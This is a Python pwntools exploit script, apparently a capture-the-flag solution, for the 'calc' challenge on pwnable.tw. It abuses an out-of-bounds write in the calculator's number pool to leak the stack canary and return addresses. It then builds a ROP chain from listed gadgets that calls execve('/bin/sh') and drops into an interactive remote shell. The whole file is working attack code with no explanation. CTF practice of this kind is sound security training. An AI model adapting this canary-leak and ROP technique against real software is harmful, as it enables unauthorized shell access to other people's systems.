from pwn import *
from ctypes import *

context(os="linux", arch="i386", log_level="debug")

ready = True

if ready:
    io = remote("chall.pwnable.tw", 10100)
else:
    io = process("./calc")
    # gdb.attach(io, "b calc")

def getpool(i):
    expr = "+ %d" % i
    io.sendline(expr)
    return int(io.recv())

def setpool(i, num):
    num = c_int32(num).value
    if num > 0:
        expr = "* %d + %d" % (i, num)
        io.sendline(expr)
        io.recv()
    elif num < 0:
        next_value = getpool(i+1)
        setpool(i , next_value)
        expr = "* %d - %d" % (i+1, -num)
        io.sendline(expr)
        io.recv()
        expr = "* %d - %d" % (i+1, next_value)
        io.sendline(expr)
        io.recv()
    else:
        next_value = getpool(i+1)
        setpool(i, next_value)
        expr = "* %d - %d" % (i+1, next_value)
        io.sendline(expr)
        io.recv()
        

elf = ELF("./calc")

"""
sys_execve("/bin/sh", 0, 0, 0)
eax = 0xb
ebx = binsh_addr
ecx = 0
edx = 0
esi = 0

0x080701D0 : pop edx ; pop ecx ; pop ebx ; ret
0x0806f4eb : dec ecx ; ret
0x0805c34b : pop eax ; ret
0x080ACEFD : pop esi ; ret
0x08049a21 : int 0x80
"""

io.recv()
main_ebp = getpool(360)
calc_ret_address = getpool(361)
canary = getpool(357)
log.success('canary = 0x' + pack(canary, 32)[::-1].encode('hex'))

calc_ebp = (main_ebp & 0xFFFFFFF0) - 0x10 - 4 - 4
offset = calc_ret_address - 0x08049499              # pie offset

setpool(372, unpack("/sh\x00", 32))
setpool(371, unpack("/bin", 32))
setpool(370, 0x08049a21)
setpool(369, 0)
setpool(368, 0x080ACEFD + offset)
setpool(367, 0xb)
setpool(366, 0x0805c34b + offset)
setpool(365, 0x0806f4eb)
setpool(364, calc_ebp + (371 - 360) * 4)
print (hex(calc_ebp + (371 - 360) * 4))
setpool(363, 1)
setpool(362, 0)
setpool(361, 0x080701D0 + offset)
setpool(360, main_ebp)
setpool(359, 0x8)
setpool(358, 0x8)
setpool(357, canary)

io.sendline()
io.interactive()